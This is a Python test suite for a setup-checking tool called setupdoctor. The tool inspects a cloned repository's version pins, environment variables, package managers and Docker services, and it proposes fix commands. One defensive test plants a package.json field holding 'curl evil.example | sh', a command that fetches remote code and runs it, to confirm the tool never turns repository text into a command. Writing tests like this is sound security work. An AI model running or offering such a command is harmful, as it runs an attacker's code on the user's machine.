"""Run with: python test_setupdoctor.py"""
import contextlib
import faulthandler
import io
import os
import shutil
import subprocess
import tempfile
import textwrap
from pathlib import Path

import setupdoctor as rd
from setupdoctor import FAIL, OK, WARN


REAL = {name: getattr(rd, name) for name in ("run_version", "on_path", "npm_global", "docker_running", "port_open")}


def real_machine():
    """Undo machine(): the end-to-end tests use the programs that are really installed."""
    for name, fn in REAL.items():
        setattr(rd, name, fn)


def repo(files):
    root = Path(tempfile.mkdtemp(prefix="setupdoctor-test-"))
    for name, content in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(textwrap.dedent(content), encoding="utf-8")
    return root


def machine(node=None, python=(3, 13, 0), tools=(), open_ports=(), off_path=(), docker_up=True, **versions):
    """Fake the machine so results don't depend on what's installed here.
    `off_path` are programs in npm's global folder that PATH doesn't reach; extra keywords are the
    versions of other programs, e.g. php=(8, 2, 0)."""
    rd.run_version = lambda *cmds, cwd=None: {"node": node, "python": python, **versions}.get(cmds[0])
    rd.on_path = lambda cmd: cmd in tools
    rd.docker_running = lambda: docker_up and "docker" in tools
    rd.npm_global = lambda name: f"/npm-global/{name}" if name in off_path else None
    rd.port_open = lambda port: port in open_ports


def has(checks, status, text):
    return any(s == status and text in msg for s, msg, *_ in checks)


def test_satisfies():
    node, py = 1, 2
    assert rd.satisfies((20, 11, 0), "20", node)
    assert rd.satisfies((20, 11, 0), "v20.9.0", node)
    assert not rd.satisfies((18, 2, 0), "20", node)
    assert rd.satisfies((22, 0, 0), ">=18", node)
    assert not rd.satisfies((18, 12, 0), ">=18.17.0", node)
    assert rd.satisfies((22, 1, 0), "^20 || ^22", node)
    assert not rd.satisfies((21, 0, 0), ">=18 <21", node)
    assert rd.satisfies((18, 0, 0), "18.x", node)
    assert rd.satisfies((3, 12, 4), "3.12.1", py)
    assert not rd.satisfies((3, 10, 4), "3.12", py)
    assert rd.satisfies((3, 13, 0), ">=3.9,<4", py)
    assert rd.satisfies((3, 13, 0), "<4,>=3.9", py)
    assert not rd.satisfies((3, 8, 0), "^3.10", py)


def test_node_repo():
    machine(node=(18, 2, 0))
    root = repo({".nvmrc": "20\n", "pnpm-lock.yaml": "",
                 "package.json": '{"dependencies": {"express": "4"}}'})
    checks = rd.diagnose(root, env={})
    assert has(checks, FAIL, "Node 20 required (.nvmrc), found 18.2.0")
    assert has(checks, FAIL, "pnpm is this repo's package manager")
    # dependencies aren't installable until the Node version is right, so no command is offered for them
    assert [(fix, run) for _, msg, fix, run in checks if "dependencies" in msg] == [
        ("pnpm install (after fixing the Node version)", None)]

    machine(node=(20, 1, 0), tools=("pnpm",))
    (root / "node_modules").mkdir()
    checks = rd.diagnose(root, env={})
    assert [s for s, *_ in checks] == [OK, OK], checks


def test_python_repo():
    machine(python=(3, 10, 4))
    files = {".python-version": "3.12\n", "requirements.txt": "flask\n"}
    checks = rd.diagnose(repo(files), env={})
    assert has(checks, FAIL, "Python 3.12 required (.python-version), found 3.10.4")
    assert has(checks, WARN, "No virtual environment")
    assert not has(rd.diagnose(repo(files), env={"VIRTUAL_ENV": "x"}), WARN, "No virtual environment")
    # uv fetches its own Python, so a mismatch isn't a problem there
    machine(python=(3, 10, 4), tools=("uv",))
    assert not has(rd.diagnose(repo(dict(files, **{"uv.lock": ""})), env={}), FAIL, "Python")


ENV_FILES = {
    "package.json": "{}",
    "src/app.js": """
        const key = process.env.STRIPE_KEY;
        const port = process.env.APP_PORT || 3000;
        const mode = process.env.NODE_ENV;
        const { SESSION_SECRET, LOG_LEVEL = "info" } = process.env;
        process.env.FORCED = "1";
        if (process.env.FLAG === "on") {}
        const server = process.env.TERNARY ? undefined : {};
        // const old = process.env.COMMENTED_OUT;
    """,
    "playwright.config.ts": "process.env.TEST_CONFIG_ONLY",
    "src/auth.ts": "const secret = process.env.JWT_SECRET!;\nconst on = process.env.FLAG !== 'off';",
    "app/aws.py": 'if "S3_BUCKET" in os.environ:\n    bucket = os.environ["S3_BUCKET"]\n'
                  'if "CF_TOKEN" in os.environ:\n    email = os.environ["CF_EMAIL"]\n',
    "app/docs.py": 'def f():\n    """Shortcut for::\n\n        load(os.environ["DOCSTRING_EXAMPLE"])\n    """\n',
    "app/db.py": """
        url = os.environ["DATABASE_URL"]
        a = os.getenv("WITH_DEFAULT", "x")
        b = os.environ.get("WITH_OR") or "y"
        os.environ["WRITTEN"] = "1"
    """,
    "tests/test_app.py": 'os.environ["TEST_ONLY"]',
    "src/app.test.js": "process.env.TEST_ONLY_JS",
    "node_modules/lib/index.js": "process.env.FROM_A_DEPENDENCY",
}


def test_env_scan():
    found = rd.scan_env(repo(ENV_FILES))
    hard = {v for v, (_, is_hard) in found.items() if is_hard}
    assert set(found) == {"STRIPE_KEY", "SESSION_SECRET", "FLAG", "DATABASE_URL", "JWT_SECRET", "S3_BUCKET",
                          "CF_EMAIL"}, found
    assert hard == {"DATABASE_URL", "JWT_SECRET"}, hard  # only unconditional reads that break when unset
    assert found["STRIPE_KEY"][0] == "src/app.js:2"


def test_env_checks():
    machine(node=(20, 0, 0))
    root = repo(dict(ENV_FILES, **{".env.example": "STRIPE_KEY=\n# FLAG=on\n"}))
    checks = rd.diagnose(root, env={})
    assert has(checks, FAIL, "No .env file; .env.example defines 1 variable(s)")
    assert has(checks, FAIL, "DATABASE_URL is not set (first used in app/db.py:2)")
    assert has(checks, FAIL, "JWT_SECRET is not set (first used in src/auth.ts:1)")
    # reads that cope with an unset variable are never failures
    assert not any(s == FAIL and v in msg for s, msg, *_ in checks
                   for v in ("STRIPE_KEY", "SESSION_SECRET", "S3_BUCKET", "CF_EMAIL"))
    # optional variables missing from .env.example are for --ci to report, not for someone who just cloned
    assert not messages(checks, WARN), checks

    (root / ".env").write_text("STRIPE_KEY=a\nDATABASE_URL=b\nJWT_SECRET=c\n")
    assert has(rd.diagnose(root, env={}), OK, "All 2 required environment variables are set")

    # code that reads env vars in a way the scan can't see still gets the .env.example check
    root = repo({"package.json": "{}", ".env.example": "JWT_SECRET=\nMONGODB_URL=\n"})
    assert has(rd.diagnose(root, env={}), FAIL, "No .env file; .env.example defines 2 variable(s)")
    (root / ".env").write_text("JWT_SECRET=a\n")
    assert has(rd.diagnose(root, env={}), WARN, "In .env.example but not in your .env: MONGODB_URL")


def test_ci_mode():
    machine()
    root = repo(dict(ENV_FILES, **{".env.example": "STRIPE_KEY=\nFLAG=\n"}))
    checks = rd.diagnose(root, ci=True, env={})
    assert sorted(msg.split()[0] for s, msg, *_ in checks if s == FAIL) == [
        "CF_EMAIL", "DATABASE_URL", "JWT_SECRET", "S3_BUCKET", "SESSION_SECRET"]
    assert len(checks) == 5  # ci mode reports nothing about this machine

    (root / ".env.example").write_text(
        "STRIPE_KEY=\nFLAG=\nDATABASE_URL=\nSESSION_SECRET=\nJWT_SECRET=\nS3_BUCKET=\nCF_EMAIL=\n")
    assert [s for s, *_ in rd.diagnose(root, ci=True, env={})] == [OK]


def test_services():
    machine(tools=("docker",))
    root = repo({"docker-compose.yml": "services:\n  db:\n    image: postgres\n",
                 "docker-compose.override.yml": 'services:\n  db:\n    ports:\n      - "5433:5432"\n'
                                                '  web:\n    ports:\n      - "3000:3000"\n',
                 "requirements.txt": "psycopg2-binary==2.9\nredis>=4\ndjango-mongo-thing\n"})
    checks = [c for c in rd.diagnose(root, env={"VIRTUAL_ENV": "x"})]
    assert has(checks, FAIL, "Postgres (docker-compose.yml) is not reachable on localhost:5433")
    assert len(checks) == 1, checks  # not the app's own port 3000, and no guessing from database drivers

    machine(open_ports=(5433,))
    assert [s for s, *_ in rd.diagnose(root, env={"VIRTUAL_ENV": "x"})] == [OK]

    # Docker installed but not started: say so, and don't offer a command that can only fail
    machine(tools=("docker",), docker_up=False)
    (check,) = rd.diagnose(root, env={"VIRTUAL_ENV": "x"})
    assert check[2:] == ("start Docker (open Docker Desktop), then: docker compose up -d", None), check

    # a container that was just started gets a moment to begin listening
    attempts = []
    rd.port_open = lambda port: attempts.append(port) or len(attempts) >= 3
    real_sleep, rd.time.sleep = rd.time.sleep, lambda seconds: None
    try:
        assert rd.wait_for_port(5433, 20) and len(attempts) == 3
        rd.port_open = lambda port: False
        assert not rd.wait_for_port(1, 0)  # no waiting unless asked
    finally:
        rd.time.sleep = real_sleep


def test_cli_output():
    machine(node=(18, 0, 0))
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        code = rd.main([str(repo({".nvmrc": "20", "package.json": "{}"}))])
    assert code == 1 and "\033" not in out.getvalue() and "1 failed" in out.getvalue(), out.getvalue()
    with contextlib.redirect_stdout(io.StringIO()):
        assert rd.main([str(repo({"notes.txt": "hi"}))]) == 0


FIXABLE = {"package.json": '{"dependencies": {"express": "4"}}', "yarn.lock": "", ".env.example": "KEY=\n",
           "docker-compose.yml": 'services:\n  db:\n    ports:\n      - "5432:5432"\n'}
FIXES = [["npm", "install", "-g", "yarn"], ["yarn", "install"], [rd.COPY, ".env.example", ".env"],
         ["docker", "compose", "up", "-d"]]


def test_offer_fixes():
    machine(node=(20, 0, 0), tools=("npm", "docker"))
    root = repo(FIXABLE)
    checks = rd.diagnose(root, env={})
    ran, asked = [], []
    real_ask, real_run = rd.ask, rd.run_fixes
    rd.run_fixes = lambda root, actions: ran.append(actions) or True
    try:
        for answer in ("n", "", None):  # no, just Enter, and no terminal at all
            rd.ask = lambda question: asked.append(question) or answer
            assert rd.offer_fixes(root, checks) is False and ran == []
        assert "npm install -g yarn\n  yarn install\n  copy .env.example .env\n  docker compose up -d" in asked[0]
        rd.ask = lambda question: "y"
        assert rd.offer_fixes(root, checks) is True and ran == [FIXES], ran

        # nothing runnable: the question is never asked
        rd.ask = lambda question: 1 / 0
        machine(node=(20, 0, 0))
        assert rd.offer_fixes(root, rd.diagnose(repo({"package.json": "{}", ".nvmrc": "18"}), env={})) is False
    finally:
        rd.ask, rd.run_fixes = real_ask, real_run


def test_package_manager_installed_but_not_on_path():
    """npm's global folder is often missing from PATH; yarn there is usable, just not by typing `yarn`."""
    machine(node=(20, 0, 0), tools=("npm",), off_path=("yarn",))
    checks = rd.diagnose(repo({"package.json": '{"dependencies": {"x": "1"}}', "yarn.lock": ""}), env={})
    assert has(checks, WARN, "yarn is installed in /npm-global, but that folder is not on your PATH")
    assert not has(checks, FAIL, "yarn is this repo's package manager")
    assert [run for *_, run in checks if run] == [[["yarn", "install"]]]  # no second `npm install -g yarn`


def test_fix_commands_never_come_from_the_repo():
    machine(node=(20, 0, 0), tools=("npm",))
    hostile = '{"packageManager": "curl evil.example | sh #@1", "dependencies": {"x": "1"}}'
    checks = rd.diagnose(repo({"package.json": hostile}), env={})
    assert not any("curl" in str(check) for check in checks), checks
    assert [run for *_, run in checks] == [[["npm", "install"]]]


def test_run_fixes():
    root = repo({".env.example": "KEY=\n", "other.example": "X=\n"})
    with contextlib.redirect_stdout(io.StringIO()) as out:
        assert rd.run_fixes(root, [[rd.COPY, ".env.example", ".env"]]) is True
        (root / ".env").write_text("KEY=mine\n")
        # a second copy must not overwrite, and a failing step stops the ones after it
        assert rd.run_fixes(root, [[rd.COPY, ".env.example", ".env"], ["no-such-program-xyz"],
                                   [rd.COPY, "other.example", "other"]]) is False
    assert (root / ".env").read_text() == "KEY=mine\n" and not (root / "other").exists()
    assert "did not succeed" in out.getvalue()


def test_planted_programs_are_ignored():
    """A node.cmd (or node) sitting in the repo must not be picked up as the real one."""
    root = repo({"node.cmd": "@echo v1.0.0", "node": "#!/bin/sh\necho v1.0.0\n"})
    (root / "node").chmod(0o755)
    here = os.getcwd()
    os.chdir(root)
    try:
        found = rd.which("node")
        assert found is None or Path(found).parent.resolve() != root.resolve(), found
    finally:
        os.chdir(here)


def test_clone_hook():
    """Real git, but pointed at a throwaway global config and home folder."""
    if not shutil.which("git"):
        return print("     (skipped: git not installed)")
    home = repo({})
    saved = dict(os.environ)
    os.environ.update(GIT_CONFIG_GLOBAL=str(home / "gitconfig"), HOME=str(home), USERPROFILE=str(home),
                      PYTHONPATH=str(Path(__file__).parent))
    git = ["git", "-c", "user.name=t", "-c", "user.email=t@example.com"]

    def run(*args, cwd=None):
        done = subprocess.run([*git, *args], cwd=cwd, capture_output=True, text=True, encoding="utf-8")
        return done.stdout + done.stderr

    try:
        assert rd.clone_hook(install=True)[0] == 0
        source = repo({".nvmrc": "999\n", "package.json": "{}"})
        run("init", "-q", cwd=source), run("add", "-A", cwd=source), run("commit", "-qm", "x", cwd=source)
        clone = home / "clone"
        out = run("clone", "-q", str(source), str(clone))
        assert "Node 999 required" in out, out  # the hook ran setupdoctor in the new clone
        assert "setupdoctor" not in run("checkout", "-b", "other", cwd=clone)  # but not on a branch switch
        assert rd.clone_hook(install=False)[0] == 0
        assert "setupdoctor" not in run("clone", "-q", str(source), str(home / "clone2"))
    finally:
        os.environ.clear()
        os.environ.update(saved)


def messages(checks, status):
    return [msg for s, msg, *_ in checks if s == status]


def test_other_languages():
    # PHP: a version range, composer, and the vendor folder
    php = {"composer.json": '{"require": {"php": "^8.1|^8.2", "laravel/framework": "^10.0"}}'}
    machine(php=(7, 4, 0), tools=("composer",))
    checks = rd.diagnose(repo(php), env={})
    assert has(checks, FAIL, "PHP ^8.1 || ^8.2 required (composer.json), found 7.4.0")
    assert checks[-1][2:] == ("composer install (after fixing the PHP version)", None), checks
    machine(php=(8, 2, 1), tools=("composer",))
    root = repo(php)
    assert [(s, run) for s, _, _, run in rd.diagnose(root, env={})] == [(OK, None), (FAIL, [["composer", "install"]])]
    (root / "vendor").mkdir()  # an empty or placeholder vendor folder doesn't count
    assert [s for s, *_ in rd.diagnose(root, env={})] == [OK, FAIL]
    (root / "vendor" / "autoload.php").write_text("<?php")
    assert [s for s, *_ in rd.diagnose(root, env={})] == [OK, OK]
    machine(php=(8, 2, 1))
    assert has(rd.diagnose(root, env={}), FAIL, "composer is needed (composer.json) but is not installed")

    ruby = {"Gemfile": 'source "https://rubygems.org"\nruby "~> 3.2"\n', ".ruby-version": "ruby-3.3.0\n"}
    machine(ruby=(3, 3, 5), tools=("bundle",))
    assert [s for s, *_ in rd.diagnose(repo(ruby), env={})] == [OK]
    machine(ruby=(3, 1, 0), tools=("bundle",))
    assert has(rd.diagnose(repo(ruby), env={}), FAIL, "Ruby 3.3.0 required (.ruby-version), found 3.1.0")

    go = {"go.mod": "module example.com/x\n\ngo 1.23\n"}
    machine(go=(1, 19, 0))
    assert has(rd.diagnose(repo(go), env={}), FAIL, "Go >=1.23 required (go.mod), found 1.19.0")
    machine(go=(1, 22, 0))  # old, but new enough to fetch 1.23 by itself
    assert messages(rd.diagnose(repo(go), env={}), OK) == [
        "Go >=1.23 required (go.mod), found 1.22.0, which downloads the newer toolchain itself"]
    machine(go=(1, 23, 1))
    assert messages(rd.diagnose(repo(go), env={}), OK) == ["Go >=1.23 required (go.mod), found 1.23.1"]

    rust = {"Cargo.toml": '[package]\nname = "x"\nrust-version = "1.75"\n'}
    machine(rustc=(1, 70, 0), tools=("cargo",))
    assert has(rd.diagnose(repo(rust), env={}), FAIL, "Rust >=1.75 required (Cargo.toml), found 1.70.0")
    machine(tools=("cargo", "rustup"))  # rustup present: the compiler is never run, rustup sorts it out
    assert messages(rd.diagnose(repo(rust), env={}), OK) == [
        "Rust >=1.75 required (Cargo.toml); rustup installs it the first time you build"]

    java = {"pom.xml": "<project><properties><maven.compiler.release>17</maven.compiler.release></properties></project>"}
    machine(java=(1, 8, 0))  # Java 8 reports itself as 1.8
    checks = rd.diagnose(repo(java), env={})
    assert has(checks, FAIL, "Java >=17 required (pom.xml), found 8.0")
    assert has(checks, FAIL, "mvn is needed (pom.xml, and the repo has no mvnw wrapper)")
    machine(java=(21, 0, 2))
    assert [s for s, *_ in rd.diagnose(repo(dict(java, mvnw="#!/bin/sh\n")), env={})] == [OK]
    gradle = {"build.gradle.kts": "java { toolchain { languageVersion.set(JavaLanguageVersion.of(21)) } }", "gradlew": ""}
    machine(java=(17, 0, 1))
    assert has(rd.diagnose(repo(gradle), env={}), FAIL, "Java >=21 required (build.gradle), found 17.0.1")

    machine(dotnet=(9, 0, 100))
    assert has(rd.diagnose(repo({"global.json": '{"sdk": {"version": "8.0.100"}}'}), env={}),
               FAIL, ".NET 8.0.100 required (global.json), found 9.0.100")
    assert [s for s, *_ in rd.diagnose(repo({"global.json": '{"sdk": {"version": "8.0.100", "rollForward": "latestMajor"}}'}),
                                       env={})] == [OK]
    assert [s for s, *_ in rd.diagnose(repo({"App.csproj": "<TargetFramework>net8.0</TargetFramework>"}), env={})] == [OK]


def test_tool_versions():
    """asdf's .tool-versions and mise.toml pin versions for any tool, not only the languages above."""
    files = {".tool-versions": "nodejs 20.11.0\nterraform 1.7.0  # infra\nelixir 1.16.0\n", "package.json": "{}"}
    machine(node=(18, 0, 0), terraform=(1, 7, 5))
    checks = rd.diagnose(repo(files), env={})
    assert messages(checks, FAIL) == ["Node 20.11.0 required (.tool-versions), found 18.0.0"]
    assert messages(checks, OK) == ["Terraform 1.7.0 required (.tool-versions), found 1.7.5"]  # elixir: not a tool it knows
    machine()
    checks = rd.diagnose(repo({"mise.toml": '[tools]\ndeno = "1.40"\n\n[env]\nFOO = "1.2"\n'}), env={})
    assert messages(checks, FAIL) == ["Deno 1.40 required (mise.toml), but no working Deno was found"]


def test_monorepo():
    files = {"backend/requirements.txt": "flask\n", "backend/.python-version": "3.12\n", "backend/.env.example": "SECRET=\n",
             "backend/app.py": 'import os\nkey = os.environ["SHARED_KEY"]\n',
             "frontend/package.json": '{"dependencies": {"react": "18"}}', "frontend/package-lock.json": "{}",
             ".env": "SHARED_KEY=abc\n"}
    machine(node=(20, 0, 0), python=(3, 10, 0), tools=("npm",))
    root = repo(files)
    checks = rd.diagnose(root, env={})
    assert has(checks, FAIL, "[backend] Python 3.12 required (.python-version), found 3.10.0")
    assert has(checks, OK, "[backend] All 1 required environment variables are set")  # from the .env at the top
    runs = [cmd for *_, run in checks for cmd in run or ()]
    assert runs == [[rd.IN, "backend", rd.COPY, ".env.example", ".env"], [rd.IN, "frontend", "npm", "install"]], runs
    assert rd.show(runs[0]) == "(backend) copy .env.example .env"
    with contextlib.redirect_stdout(io.StringIO()):
        assert rd.run_fixes(root, runs[:1]) is True
    assert (root / "backend" / ".env").is_file() and not (root / ".env.example").exists()

    # workspace packages are installed from the top folder, so they are not checked one by one...
    workspace = {"package.json": '{"workspaces": ["packages/*"], "devDependencies": {"turbo": "2"}}',
                 "packages/web/package.json": '{"dependencies": {"react": "18"}}',
                 "packages/api/package.json": '{"dependencies": {"express": "4"}}',
                 # ...unless a folder has its own lockfile, which makes it a separate install
                 "tools/cli/package.json": '{"dependencies": {"yargs": "17"}}', "tools/cli/package-lock.json": "{}"}
    machine(node=(20, 0, 0), tools=("npm",))
    assert messages(rd.diagnose(repo(workspace), env={}), FAIL) == [
        "Node dependencies not installed (no node_modules folder)",
        "[tools/cli] Node dependencies not installed (no node_modules folder)"]


def test_env_schemas():
    """Settings schemas and guard clauses say which variables are required, with no .env.example needed."""
    files = {
        "src/guard.js": 'if (!process.env.API_KEY) {\n  throw new Error("API_KEY is required");\n}\n',
        "src/env.mjs": """
            import { createEnv } from "@t3-oss/env-nextjs";
            import { z } from "zod";
            export const env = createEnv({
              server: {
                DATABASE_URL: z.string().url(),
                NEXTAUTH_SECRET: z.string().optional(),
                LISTEN_PORT: z.coerce.number().default(3000),
                LONG_ONE: z
                  .string()
                  .min(1),
              },
              runtimeEnv: { DATABASE_URL: process.env.DATABASE_URL },
            });
        """,
        "src/config.js": """
            const Joi = require('joi');
            const schema = Joi.object().keys({
              MONGODB_URL: Joi.string().required().description('Mongo DB url'),
              SMTP_HOST: Joi.string().description('server that will send the emails'),
            });
            schema.validate(process.env);
        """,
        "src/clean.ts": """
            import { cleanEnv, str, port } from 'envalid';
            export default cleanEnv(process.env, {
              API_TOKEN: str(),
              HTTP_PORT: port({ default: 3000 }),
            });
        """,
        "app/settings.py": """
            from typing import Optional
            from pydantic_settings import BaseSettings, SettingsConfigDict

            class Settings(BaseSettings):
                model_config = SettingsConfigDict(env_prefix="APP_")
                database_url: str
                debug: bool = False
                token: Optional[str]
                _private: str
        """,
        "app/django_settings.py": """
            import environ
            env = environ.Env(DEBUG=(bool, False))
            SECRET_KEY = env("DJANGO_SECRET_KEY")
            DEBUG = env("DEBUG")
            DATABASES = {"default": env.db("DB_URL", default="sqlite:///db.sqlite3")}
            CACHE = env.str("REDIS_URL")
        """,
        "app/decoupled.py": 'from decouple import config\nKEY = config("STRIPE_KEY")\nN = config("WORKERS", default=2, cast=int)\n',
        # a deployment-only settings file: what it needs is not needed to run locally
        "app/settings/production.py": 'import os\nDSN = os.environ["SENTRY_DSN"]\n',
        # other languages: reads count for documentation only, and never fail a machine check
        "lib/app.rb": 'url = ENV["QUEUE_URL"]\nport = ENV.fetch("WEB_PORT", 3000)\n',
        "cmd/main.go": 'token := os.Getenv("GO_TOKEN")\n',
    }
    found = rd.scan_env(repo(files))
    hard = sorted(v for v, (_, is_hard) in found.items() if is_hard)
    assert hard == ["API_KEY", "API_TOKEN", "APP_DATABASE_URL", "DATABASE_URL", "DJANGO_SECRET_KEY", "LONG_ONE",
                    "MONGODB_URL", "REDIS_URL", "STRIPE_KEY"], hard
    soft = sorted(v for v, (_, is_hard) in found.items() if not is_hard)
    assert soft == ["GO_TOKEN", "QUEUE_URL", "SENTRY_DSN"], soft
    assert found["MONGODB_URL"][0] == "src/config.js:4"

    machine()
    checks = rd.diagnose(repo({"main.go": 'token := os.Getenv("GO_TOKEN")\n', "go.mod": "module x\n"}), env={})
    assert not messages(checks, FAIL) or all("GO_TOKEN" not in m for m in messages(checks, FAIL))

    # found on real repos: a setdefault makes the read safe, and e2e and template folders aren't the app
    quiet = {"settings.py": "from os import environ\nenviron.setdefault('DJANGO_ENV', 'development')\nENV = environ['DJANGO_ENV']\n",
             "packages/api-e2e/wdio.conf.ts": "const key = process.env.CN_API_KEY!;",
             "{{cookiecutter.project_slug}}/config.py": 'import os\nx = os.environ["TEMPLATE_ONLY"]\n',
             "{{cookiecutter.project_slug}}/package.json": '{"dependencies": {"x": "1"}}'}
    assert rd.scan_env(repo(quiet)) == {} and rd.diagnose(repo(quiet), env={}) == []


def test_scan_time_limit():
    """A slow disk must not turn the after-clone check into a minute-long wait."""
    machine()
    root = repo({"a/one.py": 'import os\nx = os.environ["NEEDED"]\n'})
    real, rd.SCAN_SECONDS = rd.SCAN_SECONDS, -1  # already out of time
    try:
        checks = rd.diagnose(root, env={})
        assert messages(checks, WARN) == ["Stopped reading source files after -1 seconds, so a required "
                                          "environment variable could have been missed"]
        assert rd.diagnose(root, ci=True, env={})[0][0] == FAIL  # --ci is never cut short
    finally:
        rd.SCAN_SECONDS = real


def test_env_example_variants():
    """Next.js projects ship .env.local.example, and workspace packages often have their own example."""
    machine(node=(20, 0, 0), tools=("npm",))
    root = repo({"package.json": "{}", ".env.local.example": "SUPABASE_URL=\n", "app/db.ts": "const u = process.env.SUPABASE_URL!;"})
    (check,) = rd.diagnose(root, env={})
    assert check[1:] == ("No .env.local file; .env.local.example defines 1 variable(s)",
                         "cp .env.local.example .env.local, then fill in the values",
                         [[rd.COPY, ".env.local.example", ".env.local"]]), check

    # apps/live is a workspace member (no checks of its own for Node), but its env example is its own
    files = {"package.json": '{"workspaces": ["apps/*"]}', "apps/live/package.json": "{}",
             "apps/live/.env.example": "LIVE_SECRET=\n",
             "apps/live/src/env.ts": 'import { z } from "zod";\nconst s = z.object({\n  LIVE_SECRET: z.string(),\n});\ns.parse(process.env);\n'}
    checks = rd.diagnose(repo(files), env={})
    assert [(msg, run) for _, msg, _, run in checks] == [
        ("[apps/live] No .env file; .env.example defines 1 variable(s)", [[rd.IN, "apps/live", rd.COPY, ".env.example", ".env"]])]


def test_ask_reads_from_the_terminal():
    """The y/N question is read from the terminal device itself, not stdin. Checked with a real
    pseudo-terminal, which only Mac and Linux have."""
    if os.name == "nt":
        return print("     (skipped: no pseudo-terminals on Windows; checked by hand there)")
    import pty
    pid, terminal = pty.fork()
    if pid == 0:  # child: its controlling terminal is the pseudo-terminal
        os._exit(0 if rd.ask("Run them now? [y/N] ") == "y" else 1)
    def read():
        try:
            return os.read(terminal, 1024)
        except OSError:  # Linux reports the child closing the terminal as an error; macOS as end of file
            return b""

    seen = b""
    while b"[y/N]" not in seen:
        chunk = read()
        if not chunk:
            break
        seen += chunk
    os.write(terminal, b"y\n")
    while read():  # drain the echo: macOS won't let the child exit while its output is unread
        pass
    assert os.waitpid(pid, 0)[1] == 0, seen


def test_real_fixes():
    """End to end with the real npm, pip and the network: say yes, and everything gets installed."""
    if not os.environ.get("SETUPDOCTOR_INTEGRATION"):
        return print("     (skipped: downloads packages; set SETUPDOCTOR_INTEGRATION=1 to run)")
    real_machine()
    root = repo({"package.json": '{"dependencies": {"is-number": "7.0.0"}}', "requirements.txt": "six==1.16.0\n",
                 ".env.example": "KEY=\n"})
    real_ask, rd.ask = rd.ask, lambda question: "y"
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            assert rd.offer_fixes(root, rd.diagnose(root, env={})) is True
    finally:
        rd.ask = real_ask
    assert (root / "node_modules" / "is-number").is_dir() and (root / ".env").is_file()
    assert subprocess.run([str(root / rd.VENV_PYTHON), "-c", "import six"]).returncode == 0
    after = rd.diagnose(root, env={})
    assert [s for s, *_ in after] == [OK], after  # nothing left to fix


def test_real_docker():
    """`docker compose up -d` for real, then the re-check waits for the service to start listening."""
    if not os.environ.get("SETUPDOCTOR_DOCKER"):
        return print("     (skipped: needs a running Docker engine; set SETUPDOCTOR_DOCKER=1 to run)")
    real_machine()
    root = repo({"docker-compose.yml": 'services:\n  cache:\n    image: redis:7-alpine\n    ports:\n      - "6379:6379"\n'})
    checks = rd.diagnose(root, env={})
    assert [run for *_, run in checks] == [[["docker", "compose", "up", "-d"]]], checks
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            assert rd.run_fixes(root, checks[0][3]) is True
        assert [s for s, *_ in rd.diagnose(root, env={}, port_wait=30)] == [OK]
    finally:
        subprocess.run(["docker", "compose", "down"], cwd=root)


if __name__ == "__main__":
    faulthandler.dump_traceback_later(300, exit=True)  # a hung test should say where it hung, not sit there
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            fn()
            print("ok  ", name)
